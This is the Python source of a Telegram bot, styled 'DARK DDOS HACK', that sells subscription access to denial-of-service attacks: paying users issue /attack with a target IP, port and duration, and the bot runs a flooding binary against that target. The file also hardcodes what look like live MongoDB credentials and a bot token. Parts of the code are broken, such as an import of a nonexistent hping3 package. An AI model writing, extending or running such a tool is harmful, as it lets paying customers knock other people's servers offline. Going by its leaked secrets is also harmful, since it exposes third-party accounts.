import asyncio
import random
import string
import logging
import certifi
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta, timezone
from pymongo import MongoClient
import subprocess
import re

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
MONGO_URI = 'mongodb+srv://bgmibhnkmmak_db_user:5ZZpltU3dNcx1t3h@cluster0.otnamwy.mongodb.net/?appName=Cluster0'
TELEGRAM_BOT_TOKEN = '8622099533:AAFd42MONCLE8xU34AXEm_1Mxg3yn3T074U'
ADMIN_USER_ID = 5628671567

# Initialize MongoDB
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['bgmibhnkmmak']
users_collection = db['bgmibhnkmmak']
redeem_codes_collection = db['redeem_codes0']

# Global state
cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

def is_user_allowed(user_id: int) -> bool:
    """Check if user is allowed to use the bot"""
    user = users_collection.find_one({"user_id": user_id})
    if user and user.get('expiry_date'):
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        return expiry_date > datetime.now(timezone.utc)
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    
    if not is_user_allowed(user_id):
        message = (
            "*⚡️𝗗𝗔𝗥𝗞⋆𝗗𝗗𝗢𝗦⋆𝗛𝗔𝗖𝗞 ☠️*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "*𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗛𝗼𝗺𝗲 🪂*\n"
            "*𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌*\n\n"
            "🎮 *𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s*\n"
            "• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n"
            "• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n"
            "*💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?*\n"
            "*𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀*\n\n"
            "*📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @k*"
        )
    else:
        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use /attack <ip> <port> <duration>*\n"
            "*Let the war begin! ⚔️💥*"
        )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def get_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get user ID command"""
    user_id = update.effective_user.id
    message = f"*MADARCHOD KA ID HAI: `{user_id}`*"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    if not is_user_allowed(user_id):
        message = (
            "*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!*\n\n"
            "• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n"
            "• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n"
            "*🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:*\n"
            "• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n"
            "*📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @DarkDdosHack*"
        )
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
        return
    
    args = context.args
    if len(args) != 3:
        message = (
            "*📝 𝗨𝘀𝗮𝗴𝗲: /attack <target> <port> <time>*\n"
            "*𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 80 120*\n\n"
            "*⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:*\n"
            "• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            "• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 60 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
        )
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
        return
    
    ip, port, duration = args
    duration = int(duration)
    
    # Validate IP prefix
    if not any(ip.startswith(prefix) for prefix in valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return
    
    # Cooldown check
    cooldown_period = 60
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ MADARCHOD RUK JA {remaining_time} seconds*",
                parse_mode='Markdown'
            )
            return
    
    # Attack history check
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
        return
    
    # Update cooldown and history
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    
    # Send attack confirmation
    message = (
        f"*🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!*\n"
        f"*🎯 Target Locked: {ip}:{port}*\n"
        f"*⏳ Countdown: {duration} seconds*\n"
        f"*🔥 Chudai chalu h feedback bhej dena @DarkDdosOwner 💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    
    # Run attack in background
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    """Fixed attack function"""
    try:
        # Method 1: Use Python hping3 (install: pip install hping3-python)
        import hping3
        
        # Method 2: Use subprocess with proper error handling
        process = await asyncio.create_subprocess_exec(
            "./bgmi", ip, port, str(duration), "10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Wait for duration OR process to finish
        await asyncio.wait_for(process.communicate(), timeout=duration+5)
        
    except FileNotFoundError:
        await context.bot.send_message(chat_id, "*❌ bgmi binary not found! Contact admin.*")
    except asyncio.TimeoutError:
        await process.terminate()
    except Exception as e:
        logger.error(f"Attack error: {e}")
    
    # Success message
    await context.bot.send_message(
        chat_id, 
        f"*✅ Attack on {ip}:{port} completed ({duration}s)!*",
        parse_mode='Markdown'
    )
        
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to add user subscription"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(context.args[0])
        time_input = context.args[1]
        
        if time_input[-1].lower() == 'd':
            time_value = int(time_input[:-1])
            total_seconds = time_value * 86400
        elif time_input[-1].lower() == 'm':
            time_value = int(time_input[:-1])
            total_seconds = time_value * 60
        else:
            await update.message.reply_text("*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
            return
        
        expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"expiry_date": expiry_date}},
            upsert=True
        )
        await update.message.reply_text(
            f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}*.",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("*⚠️ Invalid user ID or time format!*", parse_mode='Markdown')

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to remove user"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*❌ Unauthorized!*", parse_mode='Markdown')
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(context.args[0])
        users_collection.delete_one({"user_id": target_user_id})
        await update.message.reply_text(f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("*⚠️ Invalid user ID!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to generate redeem codes"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("*❌ Unauthorized to generate codes!*", parse_mode='Markdown')
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", parse_mode='Markdown')
        return
    
    # Parse arguments
    args = context.args
    custom_code = None
    time_input = args[0]
    
    if time_input[-1].lower() not in ['d', 'm']:
        custom_code = time_input
        if len(args) < 2:
            await update.message.reply_text("*⚠️ Missing time parameter!*", parse_mode='Markdown')
            return
        time_input = args[1]
    
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day{'s' if time_value > 1 else ''}"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute{'s' if time_value > 1 else ''}"
    else:
        await update.message.reply_text("*⚠️ Invalid time format. Use 'd' for days or 'm' for minutes.*", parse_mode='Markdown')
        return
    
    redeem_code = custom_code or ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    max_uses = 1
    if len(args) > (2 if custom_code else 1):
        try:
            max_uses = int(args[2] if custom_code else args[1])
        except ValueError:
            pass
    
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    })
    
    message = (
        f"*✅ Redeem code generated: `{redeem_code}`*\n"
        f"*Expires in: {expiry_label}*\n"
        f"*Max uses: {max_uses}*"
    )
    await update.message.reply_text(message, parse_mode='Markdown')

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a code"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        message = (
            "*💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡*\n"
            "━━━━━━━━━━━━━━━\n"
            "*📝 𝗨𝘀𝗮𝗴𝗲: /redeem <code>*\n\n"
            "*⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:*\n"
            "• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n"
            "• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n"
            "• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n"
            "*💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀*"
        )
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
        return
    
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Code has reached maximum uses.*", parse_mode='Markdown')
        return
    
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    
    # Apply subscription
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    # Update code usage
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to list users"""
    if update.effective_user.id != ADMIN_USER_ID:
        return
    
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()
    
    message = "*👥 User List:*\n\n"
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        
        time_remaining = expiry_date - current_time
        if time_remaining.total_seconds() < 0:
            status = "🔴"
            expiry_label = "EXPIRED"
        else:
            days = time_remaining.days
            hours = (time_remaining.seconds // 3600)
            minutes = (time_remaining.seconds // 60) % 60
            status = "🟢"
            expiry_label = f"{days}D-{hours}H-{minutes}M"
        
        message += f"{status} *{user_id}*: {expiry_label}\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    if user_id == ADMIN_USER_ID:
        help_text = (
            "*💡 Admin Commands:*\n\n"
            "/start - Start bot\n"
            "/attack <ip> <port> <time> - Launch attack\n"
            "/add <user_id> <time> - Add user\n"
            "/remove <user_id> - Remove user\n"
            "/users - List users\n"
            "/gen [code] <time> [uses] - Generate code\n"
            "/redeem <code> - Redeem code\n"
            "/get_id - Get your ID"
        )
    else:
        help_text = (
            "*🔸 Commands:*\n\n"
            "/start - Start bot\n"
            "/attack <ip> <port> <time> - Launch attack\n"
            "/redeem <code> - Redeem code\n"
            "/get_id - Get your ID"
        )
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

def main():
    """Start the bot"""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("get_id", get_id_command))
    application.add_handler(CommandHandler("help", help_command))
    
    print("Bot started...")
    application.run_polling()

if __name__ == '__main__':
    main()
